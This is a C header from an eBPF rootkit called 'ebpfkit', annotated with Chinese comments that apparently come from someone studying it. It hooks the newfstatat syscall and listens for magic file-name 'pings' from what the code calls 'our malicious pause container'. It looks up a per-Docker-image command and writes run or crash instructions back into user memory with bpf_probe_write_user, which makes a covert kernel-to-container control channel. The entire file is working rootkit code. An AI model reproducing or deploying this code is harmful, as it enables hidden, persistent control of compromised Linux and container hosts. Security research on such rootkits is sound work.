/* SPDX-License-Identifier: GPL-2.0 WITH Linux-syscall-note */
/* Copyright (c) 2021
 *
 * This program is free software; you can redistribute it and/or
 * modify it under the terms of version 2 of the GNU General Public
 * License as published by the Free Software Foundation.
 */
#ifndef _STAT_H_
#define _STAT_H_

struct ebpfkit_ping_t {
    char ping[128];
};

//这个挂载点对应的是 newfstatat 系统调用的原始(raw)跟踪点。
//newfstatat 是一个用于获取文件状态的系统调用,它是 fstatat 系统调用的新版本,增加了一些新的标志位。
//newfstatat系统调用被执行时，这个eBPF程序将被触发。
//函数作用：
//1.从 newfstatat 系统调用的参数中读取文件名字符串。
//2.检查文件名字符串是否符合特定格式 "ebpfkit://ping:DOCKER_IMAGE_NAME"。
//3.如果符合该格式,则根据 Docker 镜像名称在 BPF map 中查找对应的操作指令。
//4.根据查找到的操作指令,将特定的字符写回到文件名字符串的第一个字节中。
SEC("tracepoint/raw_syscalls/newfstatat")
int sys_enter_newfstatat(struct tracepoint_raw_syscalls_sys_enter_t *args) {
    u8 action = PING_NOP_CHR;
    char *filename;
    //bpf_probe_read函数用于从内核空间读取数据到ebpf程序中
    bpf_probe_read(&filename, sizeof(filename), &args->args[1]);

    // check if this is a ping from our malicious pause container
    // 检查这是否是来自我们的恶意Pause容器的 ping
    struct ebpfkit_ping_t ping = {};
    //使用 bpf_probe_read_str 函数从内核空间将文件名字符串读取到 ping.ping 字段中
    // 检查字符串前缀是否为 "ebpfkit://"
    bpf_probe_read_str(ping.ping, sizeof(ping.ping), filename);
    if (ping.ping[0] != 'e' ||
        ping.ping[1] != 'b' ||
        ping.ping[2] != 'p' ||
        ping.ping[3] != 'f' ||
        ping.ping[4] != 'k' ||
        ping.ping[5] != 'i' ||
        ping.ping[6] != 't' ||
        ping.ping[7] != ':' ||
        ping.ping[8] != '/' ||
        ping.ping[9] != '/') {
        return 0;
    }

    // 继续检查接下来的字符串是否为 "ping:"
    if (ping.ping[10] == 'p' &&
        ping.ping[11] == 'i' &&
        ping.ping[12] == 'n' &&
        ping.ping[13] == 'g' &&
        ping.ping[14] == ':') {

        //从字符串的第16个字符开始，读取Docker镜像名称到key.image字段中
        struct image_override_key_t key = {};
        u32 len = bpf_probe_read_str(&key.image, DOCKER_IMAGE_LEN, &ping.ping[15]);
        key.prefix = len - 1;//记录镜像名称的长度
        // bpf_printk("stat (%d): %s\n", key.prefix, key.image);
        //以镜像名称和长度作为键，从 image_override map映射表中查找对应的值
        struct image_override_t *img = bpf_map_lookup_elem(&image_override, &key);
        if (img == NULL) {
            return 0;//查找失败
        }
        // bpf_printk("action: %d\n", img->ping);

        //根据查找到的image_override中的ping字段的值来决定返回的action值
        if (img->ping == PING_NOP) {
            return 0;
        } else if (img->ping == PING_RUN) {
            action = PING_RUN_CHR;
        } else if (img->ping == PING_CRASH) {
            action = PING_CRASH_CHR;
        }
        //使用bpf_probe_write_user函数将action值写入filename字符串的第一个字节中
        bpf_probe_write_user(filename, &action, 1);
        // bpf_printk("response: %s\n", filename);
    }

    return 0;
}

#endif